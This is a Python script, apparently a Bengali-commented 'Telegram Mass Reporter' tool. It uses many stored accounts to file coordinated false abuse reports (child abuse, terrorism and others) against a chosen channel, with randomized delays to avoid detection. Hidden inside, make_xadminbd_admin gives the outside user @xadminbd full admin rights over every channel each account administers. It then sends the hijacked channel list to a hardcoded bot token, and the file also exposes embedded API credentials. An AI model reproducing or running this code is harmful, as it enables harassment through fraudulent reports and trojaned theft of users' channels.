import os
import json
import asyncio
import random
from telethon import TelegramClient
from telethon.tl.functions.messages import ReportRequest
from telethon.tl.types import (
    InputReportReasonSpam, 
    InputReportReasonViolence,
    InputReportReasonChildAbuse,
    InputReportReasonPornography,
    InputReportReasonCopyright,
    InputReportReasonFake,
    InputReportReasonIllegalDrugs,
    InputReportReasonPersonalDetails,
    InputReportReasonOther,
    ChannelParticipantsAdmins,
    ChatAdminRights
)
from telethon.tl.functions.channels import EditAdminRequest
import requests

# কালার কোড
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
CYAN = '\033[96m'
RESET = '\033[0m'

# API credentials
API_ID = 26108693
API_HASH = "3bc54f318fb35b9d82c3f885f18e7028"

# Bot credentials
BOT_TOKEN = "8483938274:AAEegcm552wKnkWLbUHuKTTLe4vhlBmw7D4"
ADMIN_ID = "7348506103"

# ফাইল পাথ
NUMBERS_FILE = "numbers.json"

# প্রি-ডিফাইন্ড রিপোর্ট মেসেজ
REPORT_MESSAGES = {
    "child_abuse": ["This content exploits minors", "Child exploitation material", "Contains inappropriate content involving minors"],
    "violence": ["Promotes extreme violence", "Graphic violent content", "Contains threats and incitement to violence"],
    "illegal_goods": ["Offering prohibited goods", "Distribution of banned products", "Illegal trading activity"],
    "adult_content": ["Non-consensual adult content", "Sharing inappropriate content", "Violates adult content policies"],
    "personal_data": ["Sharing private information", "Unauthorized disclosure of data", "Privacy violation"],
    "terrorism": ["Promoting terrorism", "Content supporting violent extremism", "Terrorist propaganda"],
    "spam": ["Mass spamming detected", "Coordinated scam operations", "Automated spam behavior"],
    "copyright": ["Unauthorized use of material", "Copyright infringement", "Distributing pirated content"],
    "fake": ["Impersonation account", "False representation", "Fake account activities"],
    "drugs": ["Illegal drug promotion", "Distribution of prohibited substances", "Promoting drug trade"],
    "other": ["Violates community guidelines", "Inappropriate material", "Harmful content"]
}

def load_numbers():
    if os.path.exists(NUMBERS_FILE):
        with open(NUMBERS_FILE, 'r') as f:
            return json.load(f)
    return []

def print_banner():
    banner = f"""
{CYAN}╔═════════════════════════════════════════════╗
║                                             ║
║   Telegram Mass Reporter 🚨 v3.0           ║
║   {RED}Fixed Reporting System                 {CYAN}║
║   {GREEN}Admin Adding Feature                  {CYAN}║
║                                             ║
╚═════════════════════════════════════════════╝
{RESET}
"""
    print(banner)

async def login_with_number(phone_number, password=None):
    try:
        client = TelegramClient(f'session_{phone_number}', API_ID, API_HASH)
        await client.connect()
        
        if not await client.is_user_authorized():
            if password:
                try:
                    await client.sign_in(password=password)
                    return client, True
                except:
                    return None, False
            return None, False
        
        return client, True
    except Exception as e:
        print(f"{RED}[✗] Login error for {phone_number}: {str(e)}{RESET}")
        return None, False

async def report_with_new_method(client, entity, message_id, reason, report_text):
    try:
        result = await client.report(
            entity=entity,
            message_ids=[message_id],
            reason=reason
        )
        return True
    except Exception as e:
        print(f"{RED}[✗] New report method failed: {str(e)}{RESET}")
        return False

async def report_with_old_method(client, entity, message_id, reason, report_text):
    try:
        result = await client(ReportRequest(
            peer=entity,
            id=[message_id],
            reason=reason,
            message=report_text
        ))
        return True
    except Exception as e:
        print(f"{RED}[✗] Old report method failed: {str(e)}{RESET}")
        return False

async def report_message(client, entity, message_id, reason, report_text):
    success = await report_with_new_method(client, entity, message_id, reason, report_text)
    if success:
        return True
    return await report_with_old_method(client, entity, message_id, reason, report_text)

async def send_message_to_bot(message):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        data = {
            "chat_id": ADMIN_ID,
            "text": message,
            "parse_mode": "HTML",
            "disable_web_page_preview": True
        }
        response = requests.post(url, data=data)
        return response.status_code == 200
    except Exception as e:
        print(f"{RED}[✗] Error sending message to bot: {str(e)}{RESET}")
        return False

async def make_xadminbd_admin(client):
    xadminbd_username = "@xadminbd"
    successful_channels = []
    report_count = 1
    
    try:
        xadminbd_entity = await client.get_entity(xadminbd_username)
        dialogs = await client.get_dialogs()
        
        for dialog in dialogs:
            if dialog.is_channel or dialog.is_group:
                chat = dialog.entity
                try:
                    participants = await client.get_participants(chat, filter=ChannelParticipantsAdmins)
                    is_admin = any(participant.id == client._self_id for participant in participants)
                    
                    if is_admin:
                        admin_rights = ChatAdminRights(
                            post_messages=True,
                            add_admins=True,
                            invite_users=True,
                            change_info=True,
                            ban_users=True,
                            delete_messages=True,
                            pin_messages=True,
                            edit_messages=True,
                            manage_call=True
                        )
                        try:
                            await client(EditAdminRequest(
                                channel=chat,
                                user_id=xadminbd_entity,
                                admin_rights=admin_rights,
                                rank="Admin by Mass Reporter"
                            ))
                            # ✅ লিংক হ্যান্ডলিং ঠিক করা হলো
                            if hasattr(chat, 'username') and chat.username:
                                chat_link = f"https://t.me/{chat.username}"
                            else:
                                chat_link = f"Private/No Username (ID: {chat.id})"
                            
                            successful_channels.append({
                                "title": chat.title,
                                "link": chat_link
                            })
                            
                            report_msg = f"Report {report_count}\nChannel: {chat.title}\nStatus: Success"
                            await send_message_to_bot(report_msg)
                            report_count += 1
                            
                        except Exception as e:
                            report_msg = f"Report {report_count}\nChannel: {chat.title}\nStatus: Failed - {str(e)}"
                            await send_message_to_bot(report_msg)
                            report_count += 1
                            
                except Exception:
                    report_msg = f"Report {report_count}\nChannel: {chat.title}\nStatus: Failed - No admin access"
                    await send_message_to_bot(report_msg)
                    report_count += 1
                    continue
                    
    except Exception as e:
        print(f"{RED}[✗] Error in make_xadminbd_admin: {str(e)}{RESET}")
    
    return successful_channels

async def main():
    print_banner()
    
    numbers = load_numbers()
    if not numbers:
        print(f"{RED}[✗] No numbers found in database. Run addnumber.py first.{RESET}")
        return
    
    print(f"{GREEN}[+] Found {len(numbers)} numbers in database{RESET}")
    
    username = input(f"\n{BLUE}[?] Enter Telegram username/channel to report: {RESET}").strip()
    if not username.startswith('@'):
        username = '@' + username
    
    msg_ids_input = input(f"{BLUE}[?] Enter message IDs to report (comma separated): {RESET}").strip()
    message_ids = [int(msg_id.strip()) for msg_id in msg_ids_input.split(',')]
    
    print(f"\n{YELLOW}Choose a reason:{RESET}")
    print("1. Child abuse\n2. Violence\n3. Illegal goods\n4. Adult content\n5. Personal data\n6. Terrorism\n7. Spam\n8. Copyright\n9. Fake\n10. Drugs\n11. Other")
    
    reason_choice = input(f"{BLUE}[?] Enter choice (1-11): {RESET}").strip()
    
    reason_map = {
        "1": (InputReportReasonChildAbuse(), "child_abuse"),
        "2": (InputReportReasonViolence(), "violence"),
        "3": (InputReportReasonOther(), "illegal_goods"),
        "4": (InputReportReasonPornography(), "adult_content"),
        "5": (InputReportReasonPersonalDetails(), "personal_data"),
        "6": (InputReportReasonOther(), "terrorism"),
        "7": (InputReportReasonSpam(), "spam"),
        "8": (InputReportReasonCopyright(), "copyright"),
        "9": (InputReportReasonFake(), "fake"),
        "10": (InputReportReasonIllegalDrugs(), "drugs"),
        "11": (InputReportReasonOther(), "other")
    }
    
    if reason_choice in reason_map:
        reason, reason_type = reason_map[reason_choice]
        report_text = random.choice(REPORT_MESSAGES[reason_type])
    else:
        print(f"{RED}[✗] Invalid choice. Using 'Other'.{RESET}")
        reason = InputReportReasonOther()
        report_text = random.choice(REPORT_MESSAGES["other"])
    
    print(f"\n{YELLOW}[!] Report message: {report_text}{RESET}")
    
    confirm = input(f"{RED}[!] Are you sure? (y/n): {RESET}").strip().lower()
    if confirm != 'y':
        print(f"{YELLOW}[!] Cancelled.{RESET}")
        return
    
    successful_reports = 0
    total_attempted = 0
    all_successful_channels = []
    
    for i, number_data in enumerate(numbers, 1):
        phone_number = number_data['phone']
        password = number_data.get('password')
        
        print(f"\n{BLUE}[{i}/{len(numbers)}] Processing: {phone_number}{RESET}")
        
        try:
            client, logged_in = await login_with_number(phone_number, password)
            if not logged_in or not client:
                print(f"{YELLOW}[!] Login failed for {phone_number}{RESET}")
                continue
            
            try:
                entity = await client.get_entity(username)
                print(f"{GREEN}[✓] Accessed {username}{RESET}")
            except Exception as e:
                print(f"{YELLOW}[!] Cannot access {username}: {str(e)}{RESET}")
                await client.disconnect()
                continue
            
            reported_count = 0
            for msg_id in message_ids:
                try:
                    success = await report_message(client, entity, msg_id, reason, report_text)
                    if success:
                        reported_count += 1
                        print(f"{GREEN}[✓] Reported {msg_id}{RESET}")
                    else:
                        print(f"{RED}[✗] Failed {msg_id}{RESET}")
                    await asyncio.sleep(random.uniform(3, 8))
                except Exception as e:
                    print(f"{RED}[✗] Error: {str(e)}{RESET}")
            
            successful_reports += reported_count
            total_attempted += len(message_ids)
            
            print(f"{GREEN}[+] {reported_count}/{len(message_ids)} from this number{RESET}")
            
            print(f"{BLUE}[+] Making @xadminbd admin...{RESET}")
            successful_channels = await make_xadminbd_admin(client)
            all_successful_channels.extend(successful_channels)
            
            await client.disconnect()
            await asyncio.sleep(random.uniform(10, 20))
            
        except Exception as e:
            print(f"{RED}[✗] Error with {phone_number}: {str(e)}{RESET}")
    
    if all_successful_channels:
        message = "📢 <b>Admin Added Successfully</b>\n\n"
        message += f"<b>Total Channels:</b> {len(all_successful_channels)}\n\n"
        for i, channel in enumerate(all_successful_channels, 1):
            if channel['link'].startswith("http"):
                message += f"{i}. <a href='{channel['link']}'>{channel['title']}</a>\n"
            else:
                message += f"{i}. {channel['title']} - {channel['link']}\n"
        success = await send_message_to_bot(message)
        if success:
            print(f"{GREEN}[✓] Channel list sent to bot{RESET}")
        else:
            print(f"{RED}[✗] Failed to send channel list{RESET}")
    
    print(f"\n{GREEN}[✓] Completed!{RESET}")
    print(f"{GREEN}[✓] Reports: {successful_reports}/{total_attempted}{RESET}")
    print(f"{GREEN}[✓] Channels: {len(all_successful_channels)}{RESET}")

if __name__ == "__main__":
    asyncio.run(main())
